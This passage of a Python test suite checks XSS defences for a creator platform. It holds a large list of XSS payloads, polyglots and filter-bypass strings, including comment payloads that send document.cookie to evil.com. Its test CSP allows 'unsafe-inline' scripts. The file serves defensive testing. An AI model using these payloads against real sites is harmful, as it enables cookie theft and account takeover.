"""
🛡️ XSS PREVENTION TEST TEMPLATE - SECURITY EXPERT IMPLEMENTATION
==================================================================

Enterprise-grade XSS prevention testing template for iacherie Creator Economy Platform.
Comprehensive XSS security testing covering:
- Reflected XSS attack prevention
- Stored XSS attack prevention
- DOM-based XSS attack prevention
- Content Security Policy (CSP) validation
- Input sanitization and validation
- Output encoding and escaping
- Creator Economy content protection
- Rich media XSS prevention

⚠️  AVERTISSEMENT LÉGAL OBLIGATOIRE:
==========================================
© 2025 Fahed Mlaiel <mlaiel@live.de>
TOUS DROITS RÉSERVÉS

🚨 PROTECTION INTELLECTUELLE:
- Code propriétaire de Fahed Mlaiel
- Utilisation commerciale INTERDITE sans autorisation écrite
- Reverse engineering STRICTEMENT INTERDIT
- Distribution INTERDITE sans licence explicite
- Violation = Poursuites judiciaires automatiques

Author: Security Expert & XSS Prevention Specialist
Team: Lead Dev IA + Backend Senior + Security Engineer + Frontend Expert
Version: 1.0.0
"""

import pytest
import asyncio
import json
import time
import re
import html
import urllib.parse
from typing import Dict, List, Optional, Any, Union, Tuple
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
import uuid
import base64
from unittest.mock import Mock, AsyncMock, patch, MagicMock
from faker import Faker
import httpx
from bs4 import BeautifulSoup

# Application imports
from core.security import XSSProtection, CSPManager, ContentSanitizer
from core.config import get_settings
from utils.exceptions import XSSError, SecurityError, ValidationError
from monitoring.test_metrics import TestMetricsCollector
from tests.fixtures import create_test_content, create_test_user

# Initialize test utilities
fake = Faker()
settings = get_settings()


class XSSType(Enum):
    """XSS attack type classifications"""
    REFLECTED = "reflected"
    STORED = "stored"
    DOM_BASED = "dom_based"
    BLIND = "blind"
    MUTATION = "mutation"


class ContentType(Enum):
    """Content type classifications for Creator Economy"""
    TEXT = "text"
    HTML = "html"
    MARKDOWN = "markdown"
    RICH_TEXT = "rich_text"
    AUDIO_METADATA = "audio_metadata"
    VIDEO_METADATA = "video_metadata"
    USER_PROFILE = "user_profile"
    COMMENT = "comment"
    COLLABORATION = "collaboration"


@dataclass
class XSSTestPayload:
    """XSS test payload with metadata"""
    
    payload: str
    xss_type: XSSType
    content_type: ContentType
    description: str
    expected_blocked: bool = True
    severity: str = "high"
    context: str = "general"
    
    def __post_init__(self):
        self.payload_hash = hash(self.payload)


@dataclass
class XSSTestContext:
    """XSS test context with security components"""
    
    user_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    session_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    content_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    request_headers: Dict[str, str] = field(default_factory=dict)
    csp_policy: Optional[str] = None
    sanitizer_config: Dict[str, Any] = field(default_factory=dict)
    
    def __post_init__(self):
        self.request_headers.update({
            "User-Agent": fake.user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5"
        })


class XSSPreventionTestTemplate:
    """
    🛡️ ENTERPRISE XSS PREVENTION TESTING FRAMEWORK
    
    Comprehensive XSS prevention testing template providing:
    - Reflected XSS attack detection and prevention
    - Stored XSS attack detection and prevention  
    - DOM-based XSS attack prevention
    - Content Security Policy (CSP) validation
    - Input sanitization and validation testing
    - Output encoding and escaping verification
    - Creator Economy content protection
    - Rich media XSS prevention
    - Performance impact assessment
    - Advanced XSS attack simulations
    """
    
    def __init__(self):
        self.xss_protection = XSSProtection()
        self.csp_manager = CSPManager()
        self.content_sanitizer = ContentSanitizer()
        self.metrics_collector = TestMetricsCollector("xss_prevention")
        self.test_payloads = self._generate_xss_payloads()
        
    async def setup_test_environment(self) -> XSSTestContext:
        """Setup isolated XSS prevention test environment"""
        context = XSSTestContext()
        
        # Setup CSP policy
        context.csp_policy = await self._setup_csp_policy()
        
        # Setup sanitizer configuration
        context.sanitizer_config = await self._setup_sanitizer_config()
        
        return context
    
    async def teardown_test_environment(self, context: XSSTestContext):
        """Clean up XSS test environment"""
        try:
            # Clear any test content
            await self._cleanup_test_content(context)
            
        except Exception as e:
            self.metrics_collector.record_error("teardown_failed", str(e))
    
    def _generate_xss_payloads(self) -> List[XSSTestPayload]:
        """Generate comprehensive XSS test payloads"""
        
        payloads = [
            # Basic script injection
            XSSTestPayload(
                payload="<script>alert('XSS')</script>",
                xss_type=XSSType.REFLECTED,
                content_type=ContentType.HTML,
                description="Basic script tag injection"
            ),
            
            # Event handler injection
            XSSTestPayload(
                payload="<img src=x onerror=alert('XSS')>",
                xss_type=XSSType.REFLECTED,
                content_type=ContentType.HTML,
                description="Image onerror event handler"
            ),
            
            # Javascript URL injection
            XSSTestPayload(
                payload="<a href='javascript:alert(\"XSS\")'>Click me</a>",
                xss_type=XSSType.REFLECTED,
                content_type=ContentType.HTML,
                description="Javascript URL injection"
            ),
            
            # SVG-based XSS
            XSSTestPayload(
                payload="<svg onload=alert('XSS')>",
                xss_type=XSSType.REFLECTED,
                content_type=ContentType.HTML,
                description="SVG onload event injection"
            ),
            
            # Data URI XSS
            XSSTestPayload(
                payload="<iframe src='data:text/html,<script>alert(\"XSS\")</script>'></iframe>",
                xss_type=XSSType.REFLECTED,
                content_type=ContentType.HTML,
                description="Data URI iframe injection"
            ),
            
            # CSS-based XSS
            XSSTestPayload(
                payload="<style>@import'javascript:alert(\"XSS\")';</style>",
                xss_type=XSSType.REFLECTED,
                content_type=ContentType.HTML,
                description="CSS import XSS"
            ),
            
            # Form injection
            XSSTestPayload(
                payload="<form><button formaction=javascript:alert('XSS')>Click</button></form>",
                xss_type=XSSType.REFLECTED,
                content_type=ContentType.HTML,
                description="Form action injection"
            ),
            
            # Meta refresh injection
            XSSTestPayload(
                payload="<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>",
                xss_type=XSSType.REFLECTED,
                content_type=ContentType.HTML,
                description="Meta refresh injection"
            ),
            
            # Encoded payloads
            XSSTestPayload(
                payload="&lt;script&gt;alert('XSS')&lt;/script&gt;",
                xss_type=XSSType.REFLECTED,
                content_type=ContentType.HTML,
                description="HTML encoded script injection",
                expected_blocked=False  # Should be safe after encoding
            ),
            
            # Double encoding
            XSSTestPayload(
                payload="%253Cscript%253Ealert('XSS')%253C/script%253E",
                xss_type=XSSType.REFLECTED,
                content_type=ContentType.HTML,
                description="Double URL encoded script"
            ),
            
            # Creator Economy specific payloads
            XSSTestPayload(
                payload="<audio controls><source src='javascript:alert(\"XSS\")'></audio>",
                xss_type=XSSType.STORED,
                content_type=ContentType.AUDIO_METADATA,
                description="Audio source XSS",
                context="creator_content"
            ),
            
            XSSTestPayload(
                payload="<video controls><source src='x' onerror='alert(\"XSS\")'></video>",
                xss_type=XSSType.STORED,
                content_type=ContentType.VIDEO_METADATA,
                description="Video source onerror XSS",
                context="creator_content"
            ),
            
            # Rich text editor payloads
            XSSTestPayload(
                payload="[b]Hello[/b]<script>alert('XSS')</script>",
                xss_type=XSSType.STORED,
                content_type=ContentType.RICH_TEXT,
                description="BBCode with script injection",
                context="creator_content"
            ),
            
            # Markdown-based XSS
            XSSTestPayload(
                payload="[Click me](javascript:alert('XSS'))",
                xss_type=XSSType.STORED,
                content_type=ContentType.MARKDOWN,
                description="Markdown link with javascript URL",
                context="creator_content"
            ),
            
            # Comment system XSS
            XSSTestPayload(
                payload="Great content! <img src=x onerror=fetch('//evil.com/steal?data='+document.cookie)>",
                xss_type=XSSType.STORED,
                content_type=ContentType.COMMENT,
                description="Comment with data exfiltration",
                context="collaboration"
            ),
            
            # Profile injection
            XSSTestPayload(
                payload="<script>if(document.location.hostname=='iacherie.com')alert('Profile XSS')</script>",
                xss_type=XSSType.STORED,
                content_type=ContentType.USER_PROFILE,
                description="Profile conditional XSS",
                context="user_profile"
            ),
            
            # DOM-based XSS payloads
            XSSTestPayload(
                payload="#<script>alert('DOM XSS')</script>",
                xss_type=XSSType.DOM_BASED,
                content_type=ContentType.TEXT,
                description="Fragment-based DOM XSS"
            ),
            
            # Advanced filter bypass attempts
            XSSTestPayload(
                payload="<ScRiPt>alert('XSS')</ScRiPt>",
                xss_type=XSSType.REFLECTED,
                content_type=ContentType.HTML,
                description="Case variation bypass attempt"
            ),
            
            XSSTestPayload(
                payload="<script\x00>alert('XSS')</script>",
                xss_type=XSSType.REFLECTED,
                content_type=ContentType.HTML,
                description="Null byte bypass attempt"
            ),
            
            XSSTestPayload(
                payload="<script\n>alert('XSS')</script>",
                xss_type=XSSType.REFLECTED,
                content_type=ContentType.HTML,
                description="Newline bypass attempt"
            ),
            
            # Mobile app context XSS
            XSSTestPayload(
                payload="<iframe src='intent://evil.com#Intent;scheme=http;end'>",
                xss_type=XSSType.REFLECTED,
                content_type=ContentType.HTML,
                description="Android intent XSS",
                context="mobile"
            )
        ]
        
        return payloads
    
    async def _setup_csp_policy(self) -> str:
        """Setup Content Security Policy for testing"""
        
        csp_policy = (
            "default-src 'self'; "
            "script-src 'self' 'unsafe-inline' https://cdn.iacherie.com; "
            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
            "img-src 'self' data: https:; "
            "media-src 'self' https://media.iacherie.com; "
            "connect-src 'self' https://api.iacherie.com; "
            "font-src 'self' https://fonts.gstatic.com; "
            "object-src 'none'; "
            "base-uri 'self'; "
            "form-action 'self'; "
            "frame-ancestors 'none'"
        )
        
        return csp_policy
    
    async def _setup_sanitizer_config(self) -> Dict[str, Any]:
        """Setup content sanitizer configuration"""
        
        config = {
            "allowed_tags": [
                "p", "br", "strong", "em", "u", "h1", "h2", "h3", "h4", "h5", "h6",
                "ul", "ol", "li", "blockquote", "a", "img"
            ],
            "allowed_attributes": {
                "a": ["href", "title"],
                "img": ["src", "alt", "title", "width", "height"],
                "*": ["class"]
            },
            "allowed_protocols": ["http", "https", "mailto"],
            "strip_disallowed": True,
            "escape_disallowed": False
        }
        
        return config
    
    async def _cleanup_test_content(self, context: XSSTestContext):
        """Clean up test content"""
        # Implementation would clean up any test content created
        pass

    # ==================== REFLECTED XSS PREVENTION TESTS ====================
    
    async def test_reflected_xss_prevention(self, context: XSSTestContext):
        """Test reflected XSS attack prevention"""
        start_time = time.time()
        
        try:
            reflected_payloads = [
                payload for payload in self.test_payloads 
                if payload.xss_type == XSSType.REFLECTED
            ]
            
            for payload in reflected_payloads:
                # Test URL parameter injection
                url_test = f"https://iacherie.com/search?q={urllib.parse.quote(payload.payload)}"
                
                is_safe = await self.xss_protection.validate_url_parameters(
                    url_test,
                    context
                )
                
                if payload.expected_blocked:
                    assert is_safe is False, f"Reflected XSS not blocked: {payload.description}"
                else:
                    assert is_safe is True, f"Safe content incorrectly blocked: {payload.description}"
                
                # Test form parameter injection
                form_data = {"content": payload.payload, "type": "search"}
                
                is_safe = await self.xss_protection.validate_form_data(
                    form_data,
                    context
                )
                
                if payload.expected_blocked:
                    assert is_safe is False, f"Form XSS not blocked: {payload.description}"
                
                # Test header injection
                headers_with_payload = context.request_headers.copy()
                headers_with_payload["X-Custom-Data"] = payload.payload
                
                is_safe = await self.xss_protection.validate_headers(
                    headers_with_payload,
                    context
                )
                
                if payload.expected_blocked:
                    assert is_safe is False, f"Header XSS not blocked: {payload.description}"
            
            self.metrics_collector.record_success(
                "reflected_xss_prevention",
                time.time() - start_time
            )
            
        except Exception as e:
            self.metrics_collector.record_error("reflected_xss_prevention_failed", str(e))
            raise AssertionError(f"Reflected XSS prevention test failed: {e}")
    
    async def test_reflected_xss_encoding(self, context: XSSTestContext):
        """Test reflected XSS prevention through proper encoding"""
        start_time = time.time()
        
        try:
            # Test different encoding methods
            test_payload = "<script>alert('XSS')</script>"
            
            # HTML encoding
            html_encoded = await self.xss_protection.html_encode(test_payload)
            assert "&lt;" in html_encoded
            assert "&gt;" in html_encoded
            assert "script" not in html_encoded.replace("&lt;script&gt;", "")
            
            # URL encoding
            url_encoded = await self.xss_protection.url_encode(test_payload)
            assert "%3C" in url_encoded or "%3c" in url_encoded
            assert "script" in url_encoded
            
            # JavaScript encoding
            js_encoded = await self.xss_protection.javascript_encode(test_payload)
            assert "\\x3C" in js_encoded or "\\u003C" in js_encoded
            
            # CSS encoding
            css_encoded = await self.xss_protection.css_encode(test_payload)
            assert "\\3C" in css_encoded or "\\00003C" in css_encoded
            
            # Test context-aware encoding
            contexts = {
                "html": test_payload,
                "html_attribute": f'value="{test_payload}"',
                "javascript": f'var data = "{test_payload}";',
                "css": f'background: url("{test_payload}");',
                "url": f'?param={test_payload}'
            }
            
            for context_type, test_data in contexts.items():
                encoded = await self.xss_protection.context_encode(test_data, context_type)
                
                # Verify dangerous patterns are encoded
                dangerous_patterns = ["<script", "javascript:", "onerror=", "onload="]
                for pattern in dangerous_patterns:
                    assert pattern.lower() not in encoded.lower(), f"Dangerous pattern '{pattern}' not encoded in {context_type}"
            
            self.metrics_collector.record_success(
                "reflected_xss_encoding",
                time.time() - start_time
            )
            
        except Exception as e:
            self.metrics_collector.record_error("reflected_xss_encoding_failed", str(e))
            raise AssertionError(f"Reflected XSS encoding test failed: {e}")

    # ==================== STORED XSS PREVENTION TESTS ====================
    
    async def test_stored_xss_prevention(self, context: XSSTestContext):
        """Test stored XSS attack prevention"""
        start_time = time.time()
        
        try:
            stored_payloads = [
                payload for payload in self.test_payloads 
                if payload.xss_type == XSSType.STORED
            ]
            
            for payload in stored_payloads:
                # Test content creation with XSS payload
                content_data = {
                    "title": f"Test Content - {payload.description}",
                    "body": payload.payload,
                    "content_type": payload.content_type.value,
                    "user_id": context.user_id
                }
                
                # Attempt to store content
                sanitized_content = await self.content_sanitizer.sanitize_content(
                    content_data,
                    context.sanitizer_config
                )
                
                if payload.expected_blocked:
                    # Verify XSS payload was removed/neutralized
                    assert "<script" not in sanitized_content["body"].lower()
                    assert "javascript:" not in sanitized_content["body"].lower()
                    assert "onerror=" not in sanitized_content["body"].lower()
                    assert "onload=" not in sanitized_content["body"].lower()
                
                # Test content retrieval and rendering
                rendered_content = await self.xss_protection.safe_render_content(
                    sanitized_content,
                    context
                )
                
                if payload.expected_blocked:
                    # Verify no executable JavaScript in rendered content
                    assert not await self._contains_executable_js(rendered_content["body"])
                
                # Test different content types
                if payload.content_type == ContentType.RICH_TEXT:
                    # Rich text should have additional sanitization
                    assert await self._is_safe_rich_text(sanitized_content["body"])
                
                elif payload.content_type == ContentType.MARKDOWN:
                    # Markdown should be safely converted
                    assert await self._is_safe_markdown(sanitized_content["body"])
                
                elif payload.content_type in [ContentType.AUDIO_METADATA, ContentType.VIDEO_METADATA]:
                    # Media metadata should be strictly validated
                    assert await self._is_safe_media_metadata(sanitized_content["body"])
            
            self.metrics_collector.record_success(
                "stored_xss_prevention",
                time.time() - start_time
            )
            
        except Exception as e:
            self.metrics_collector.record_error("stored_xss_prevention_failed", str(e))
            raise AssertionError(f"Stored XSS prevention test failed: {e}")
    
    async def test_creator_content_xss_prevention(self, context: XSSTestContext):
        """Test XSS prevention in Creator Economy content"""
        start_time = time.time()
        
        try:
            # Test creator profile XSS prevention
            profile_data = {
                "display_name": "<script>alert('Profile XSS')</script>",
                "bio": "Creator bio with <img src=x onerror=alert('XSS')>",
                "website": "javascript:alert('Website XSS')",
                "social_links": {
                    "twitter": "<script>steal_data()</script>",
                    "youtube": "https://youtube.com/user<script>alert('XSS')</script>"
                }
            }
            
            sanitized_profile = await self.content_sanitizer.sanitize_profile(
                profile_data,
                context
            )
            
            # Verify profile fields are safe
            assert "<script" not in sanitized_profile["display_name"].lower()
            assert "onerror=" not in sanitized_profile["bio"].lower()
            assert "javascript:" not in sanitized_profile["website"].lower()
            
            # Test content metadata XSS prevention
            content_metadata = {
                "title": "<script>alert('Title XSS')</script>",
                "description": "Content with <iframe src='javascript:alert(\"XSS\")'></iframe>",
                "tags": ["music", "<script>alert('Tag XSS')</script>", "audio"],
                "custom_fields": {
                    "genre": "Electronic<script>alert('Genre XSS')</script>",
                    "mood": "<svg onload=alert('Mood XSS')>"
                }
            }
            
            sanitized_metadata = await self.content_sanitizer.sanitize_metadata(
                content_metadata,
                context
            )
            
            # Verify metadata is safe
            assert "<script" not in sanitized_metadata["title"].lower()
            assert "<iframe" not in sanitized_metadata["description"].lower()
            assert not any("<script" in tag.lower() for tag in sanitized_metadata["tags"])
            
            # Test collaboration invite XSS prevention
            collaboration_data = {
                "message": "Join my project! <script>window.location='http://evil.com'</script>",
                "permissions": ["edit", "<script>alert('Permission XSS')</script>"],
                "project_description": "Amazing project<img src=x onerror=fetch('//evil.com/steal')>"
            }
            
            sanitized_collaboration = await self.content_sanitizer.sanitize_collaboration(
                collaboration_data,
                context
            )
            
            # Verify collaboration data is safe
            assert "<script" not in sanitized_collaboration["message"].lower()
            assert "onerror=" not in sanitized_collaboration["project_description"].lower()
            
            # Test comment system XSS prevention
            comment_data = {
                "text": "Great content! <script>document.location='http://phishing.com'</script>",
                "reply_to": None,
                "attachments": [
                    {"name": "file<script>alert('XSS')</script>.txt", "url": "javascript:alert('File XSS')"}
                ]
            }
            
            sanitized_comment = await self.content_sanitizer.sanitize_comment(
                comment_data,
                context
            )
            
            # Verify comment is safe
            assert "<script" not in sanitized_comment["text"].lower()
            assert "javascript:" not in sanitized_comment["attachments"][0]["url"].lower()
            
            self.metrics_collector.record_success(
                "creator_content_xss_prevention",
                time.time() - start_time
            )
            
        except Exception as e:
            self.metrics_collector.record_error("creator_content_xss_prevention_failed", str(e))
            raise AssertionError(f"Creator content XSS prevention test failed: {e}")

    # ==================== DOM-BASED XSS PREVENTION TESTS ====================
    
    async def test_dom_based_xss_prevention(self, context: XSSTestContext):
        """Test DOM-based XSS attack prevention"""
        start_time = time.time()
        
        try:
            dom_payloads = [
                payload for payload in self.test_payloads 
                if payload.xss_type == XSSType.DOM_BASED
            ]
            
            # Test client-side validation patterns
            client_side_patterns = [
                "document.write",
                "innerHTML",
                "outerHTML", 
                "document.URL",
                "document.location",
                "window.location",
                "eval(",
                "setTimeout(",
                "setInterval("
            ]
            
            for payload in dom_payloads:
                # Test if payload would trigger DOM-based XSS
                is_dom_safe = await self.xss_protection.validate_dom_content(
                    payload.payload,
                    context
                )
                
                if payload.expected_blocked:
                    assert is_dom_safe is False, f"DOM XSS not detected: {payload.description}"
                
                # Test fragment-based XSS
                fragment_payload = f"#{payload.payload}"
                is_fragment_safe = await self.xss_protection.validate_url_fragment(
                    fragment_payload,
                    context
                )
                
                if payload.expected_blocked:
                    assert is_fragment_safe is False, f"Fragment XSS not detected: {payload.description}"
            
            # Test JavaScript source validation
            js_sources = [
                "var userInput = location.hash.substr(1); document.write(userInput);",
                "document.getElementById('output').innerHTML = getURLParameter('data');",
                "eval('var data = \"' + document.location + '\";');",
                "setTimeout('alert(\"' + window.name + '\")', 1000);",
                "document.write('<img src=\"' + document.referrer + '\">');"
            ]
            
            for js_source in js_sources:
                is_safe = await self.xss_protection.validate_javascript_source(
                    js_source,
                    context
                )
                
                # These patterns should be flagged as potentially dangerous
                assert is_safe is False, f"Dangerous JavaScript pattern not detected: {js_source[:50]}..."
            
            # Test safe JavaScript patterns
            safe_js_sources = [
                "var userInput = encodeURIComponent(location.hash.substr(1)); document.getElementById('output').textContent = userInput;",
                "document.getElementById('output').textContent = getURLParameter('data');",
                "var data = JSON.parse(document.location); console.log(data);",
                "setTimeout(function() { alert('Safe timeout'); }, 1000);",
                "document.createElement('img').src = encodeURI(document.referrer);"
            ]
            
            for safe_js in safe_js_sources:
                is_safe = await self.xss_protection.validate_javascript_source(
                    safe_js,
                    context
                )
                
                # These patterns should be considered safe
                assert is_safe is True, f"Safe JavaScript pattern incorrectly flagged: {safe_js[:50]}..."
            
            self.metrics_collector.record_success(
                "dom_based_xss_prevention",
                time.time() - start_time
            )
            
        except Exception as e:
            self.metrics_collector.record_error("dom_based_xss_prevention_failed", str(e))
            raise AssertionError(f"DOM-based XSS prevention test failed: {e}")

    # ==================== CONTENT SECURITY POLICY TESTS ====================
    
    async def test_content_security_policy(self, context: XSSTestContext):
        """Test Content Security Policy effectiveness"""
        start_time = time.time()
        
        try:
            # Test CSP header generation
            csp_header = await self.csp_manager.generate_csp_header(context)
            
            assert "default-src" in csp_header
            assert "script-src" in csp_header
            assert "object-src 'none'" in csp_header
            
            # Test CSP violation detection
            violations = [
                {
                    "blocked-uri": "inline",
                    "directive": "script-src",
                    "original-policy": context.csp_policy,
                    "violated-directive": "script-src"
                },
                {
                    "blocked-uri": "eval",
                    "directive": "script-src", 
                    "original-policy": context.csp_policy,
                    "violated-directive": "script-src"
                },
                {
                    "blocked-uri": "https://evil.com/malicious.js",
                    "directive": "script-src",
                    "original-policy": context.csp_policy,
                    "violated-directive": "script-src"
                }
            ]
            
            for violation in violations:
                is_violation = await self.csp_manager.validate_csp_violation(
                    violation,
                    context
                )
                
                assert is_violation is True, f"CSP violation not detected: {violation['blocked-uri']}"
            
            # Test nonce-based CSP
            nonce = await self.csp_manager.generate_nonce()
            assert len(nonce) >= 16  # Sufficient entropy
            assert nonce.isalnum() or "+" in nonce or "/" in nonce  # Base64 pattern
            
            nonce_csp = await self.csp_manager.generate_nonce_csp(nonce)
            assert f"'nonce-{nonce}'" in nonce_csp
            
            # Test hash-based CSP
            script_content = "console.log('Safe script');"
            script_hash = await self.csp_manager.generate_script_hash(script_content)
            
            hash_csp = await self.csp_manager.generate_hash_csp([script_hash])
            assert f"'sha256-{script_hash}'" in hash_csp
            
            # Test CSP for Creator Economy
            creator_csp = await self.csp_manager.generate_creator_csp(context)
            
            # Should allow media sources
            assert "media-src" in creator_csp
            assert "https://media.iacherie.com" in creator_csp
            
            # Should restrict object sources
            assert "object-src 'none'" in creator_csp
            
            # Should allow connect to API
            assert "connect-src" in creator_csp
            assert "https://api.iacherie.com" in creator_csp
            
            self.metrics_collector.record_success(
                "content_security_policy",
                time.time() - start_time
            )
            
        except Exception as e:
            self.metrics_collector.record_error("content_security_policy_failed", str(e))
            raise AssertionError(f"Content Security Policy test failed: {e}")

    # ==================== INPUT SANITIZATION TESTS ====================
    
    async def test_input_sanitization(self, context: XSSTestContext):
        """Test comprehensive input sanitization"""
        start_time = time.time()
        
        try:
            # Test HTML sanitization
            html_inputs = [
                "<p>Safe content</p>",
                "<script>alert('XSS')</script><p>Content</p>",
                "<p onclick='alert(\"XSS\")'>Clickable content</p>",
                "<a href='javascript:alert(\"XSS\")'>Link</a>",
                "<img src='x' onerror='alert(\"XSS\")' alt='Image'>",
                "<style>body { background: url('javascript:alert(\"XSS\")'); }</style>",
                "<iframe src='https://evil.com'></iframe>",
                "<object data='malicious.swf'></object>",
                "<embed src='malicious.swf'></embed>"
            ]
            
            for html_input in html_inputs:
                sanitized = await self.content_sanitizer.sanitize_html(
                    html_input,
                    context.sanitizer_config
                )
                
                # Verify dangerous elements are removed
                dangerous_elements = ["script", "iframe", "object", "embed", "style"]
                for element in dangerous_elements:
                    assert f"<{element}" not in sanitized.lower()
                
                # Verify dangerous attributes are removed
                dangerous_attributes = ["onclick", "onerror", "onload", "onmouseover"]
                for attr in dangerous_attributes:
                    assert f"{attr}=" not in sanitized.lower()
                
                # Verify javascript URLs are removed
                assert "javascript:" not in sanitized.lower()
            
            # Test URL sanitization
            url_inputs = [
                "https://safe-site.com/path",
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "vbscript:msgbox('XSS')",
                "file:///etc/passwd",
                "ftp://evil.com/malware.exe",
                "mailto:test@example.com?subject=<script>alert('XSS')</script>"
            ]
            
            for url_input in url_inputs:
                sanitized_url = await self.content_sanitizer.sanitize_url(
                    url_input,
                    allowed_protocols=["http", "https", "mailto"]
                )
                
                # Verify dangerous protocols are removed
                dangerous_protocols = ["javascript:", "data:", "vbscript:", "file:"]
                for protocol in dangerous_protocols:
                    assert not sanitized_url.startswith(protocol)
            
            # Test attribute sanitization
            attributes = {
                "href": "javascript:alert('XSS')",
                "src": "https://safe-cdn.com/image.jpg",
                "onclick": "alert('XSS')",
                "style": "background: url('javascript:alert(\"XSS\")')",
                "title": "Safe title text",
                "alt": "<script>alert('XSS')</script>",
                "class": "safe-class evil<script>alert('XSS')</script>"
            }
            
            sanitized_attrs = await self.content_sanitizer.sanitize_attributes(
                attributes,
                context.sanitizer_config
            )
            
            # Verify dangerous attributes are removed or sanitized
            assert "onclick" not in sanitized_attrs
            assert "javascript:" not in sanitized_attrs.get("href", "")
            assert "<script" not in sanitized_attrs.get("alt", "")
            assert "javascript:" not in sanitized_attrs.get("style", "")
            
            self.metrics_collector.record_success(
                "input_sanitization",
                time.time() - start_time
            )
            
        except Exception as e:
            self.metrics_collector.record_error("input_sanitization_failed", str(e))
            raise AssertionError(f"Input sanitization test failed: {e}")

    # ==================== ADVANCED XSS ATTACK SIMULATIONS ====================
    
    async def test_advanced_xss_attacks(self, context: XSSTestContext):
        """Test advanced XSS attack scenarios"""
        start_time = time.time()
        
        try:
            # Test mutation XSS
            mutation_payloads = [
                "<listing><img src=x onerror=alert(1)//</listing>",
                "<image src=1 href=1 onerror=\"javascript:alert(1)\"></image>",
                "<svg><script href=\"data:,alert(1)\" />",
                "<details open ontoggle=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<video><source onerror=\"javascript:alert(1)\"></video>"
            ]
            
            for payload in mutation_payloads:
                is_safe = await self.xss_protection.validate_mutation_xss(
                    payload,
                    context
                )
                
                assert is_safe is False, f"Mutation XSS not detected: {payload[:50]}..."
            
            # Test polyglot payloads (work in multiple contexts)
            polyglot_payloads = [
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
                "'\"--></script></style></textarea></title><svg/onload=+/\"'/*/*/alert()//>",
                "'\"><svg/onload=alert`1`//",
                "'><script>alert(document.domain)</script>",
                "\"><script>alert(String.fromCharCode(88,83,83))</script>"
            ]
            
            for payload in polyglot_payloads:
                # Test in different contexts
                contexts_to_test = [
                    {"type": "html", "content": f"<div>{payload}</div>"},
                    {"type": "attribute", "content": f'<input value="{payload}">'},
                    {"type": "script", "content": f'var data = "{payload}";'},
                    {"type": "style", "content": f'body {{ content: "{payload}"; }}'},
                    {"type": "url", "content": f'?param={payload}'}
                ]
                
                for test_context in contexts_to_test:
                    is_safe = await self.xss_protection.validate_polyglot_xss(
                        test_context["content"],
                        test_context["type"],
                        context
                    )
                    
                    assert is_safe is False, f"Polyglot XSS not detected in {test_context['type']}"
            
            # Test filter bypass techniques
            bypass_techniques = [
                # Encoding bypasses
                {"payload": "%3Cscript%3Ealert(1)%3C/script%3E", "technique": "URL encoding"},
                {"payload": "&#60;script&#62;alert(1)&#60;/script&#62;", "technique": "HTML entity encoding"},
                {"payload": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", "technique": "Unicode encoding"},
                
                # Case variation bypasses
                {"payload": "<ScRiPt>alert(1)</ScRiPt>", "technique": "Case variation"},
                {"payload": "<SCRIPT>alert(1)</SCRIPT>", "technique": "Uppercase"},
                
                # Whitespace bypasses
                {"payload": "<script\t>alert(1)</script>", "technique": "Tab character"},
                {"payload": "<script\n>alert(1)</script>", "technique": "Newline character"},
                {"payload": "<script\r>alert(1)</script>", "technique": "Carriage return"},
                {"payload": "<script\x0c>alert(1)</script>", "technique": "Form feed"},
                
                # Comment bypasses
                {"payload": "<script>/**/alert(1)</script>", "technique": "Comment insertion"},
                {"payload": "<script>al/**/ert(1)</script>", "technique": "Function splitting"},
                
                # Concatenation bypasses
                {"payload": "<script>eval('al'+'ert(1)')</script>", "technique": "String concatenation"},
                {"payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>", "technique": "CharCode bypass"}
            ]
            
            for bypass in bypass_techniques:
                is_blocked = await self.xss_protection.validate_bypass_attempt(
                    bypass["payload"],
                    bypass["technique"],
                    context
                )
                
                assert is_blocked is False, f"Bypass technique not detected: {bypass['technique']}"
            
            self.metrics_collector.record_success(
                "advanced_xss_attacks",
                time.time() - start_time
            )
            
        except Exception as e:
            self.metrics_collector.record_error("advanced_xss_attacks_failed", str(e))
            raise AssertionError(f"Advanced XSS attacks test failed: {e}")

    # ==================== PERFORMANCE & LOAD TESTING ====================
    
    async def test_xss_protection_performance(self, context: XSSTestContext):
        """Test XSS protection performance under load"""
        start_time = time.time()
        
        try:
            # Test concurrent XSS validation
            concurrent_requests = 100
            max_response_time = 0.1  # 100ms max
            
            async def validate_xss_content():
                validation_start = time.time()
                
                # Use a complex payload for testing
                payload = "<script>alert('XSS')</script><img src=x onerror=alert('XSS')><svg onload=alert('XSS')>"
                
                result = await self.content_sanitizer.sanitize_html(
                    payload,
                    context.sanitizer_config
                )
                
                validation_time = time.time() - validation_start
                return result, validation_time
            
            # Run concurrent XSS validation tests
            tasks = [validate_xss_content() for _ in range(concurrent_requests)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            successful_validations = 0
            total_validation_time = 0
            
            for result in results:
                if isinstance(result, tuple):
                    validation_result, validation_time = result
                    if validation_result is not None:
                        successful_validations += 1
                        total_validation_time += validation_time
                        assert validation_time < max_response_time, f"XSS validation took {validation_time}s (max: {max_response_time}s)"
            
            # Performance assertions
            success_rate = successful_validations / concurrent_requests
            avg_response_time = total_validation_time / successful_validations if successful_validations > 0 else 0
            
            assert success_rate >= 0.95, f"Success rate {success_rate} below 95%"
            assert avg_response_time < max_response_time / 2, f"Average response time {avg_response_time}s too high"
            
            # Test large content sanitization performance
            large_content = "<p>" + "Safe content. " * 1000 + "</p>" + "<script>alert('XSS')</script>" * 10
            
            large_content_start = time.time()
            sanitized_large = await self.content_sanitizer.sanitize_html(
                large_content,
                context.sanitizer_config
            )
            large_content_time = time.time() - large_content_start
            
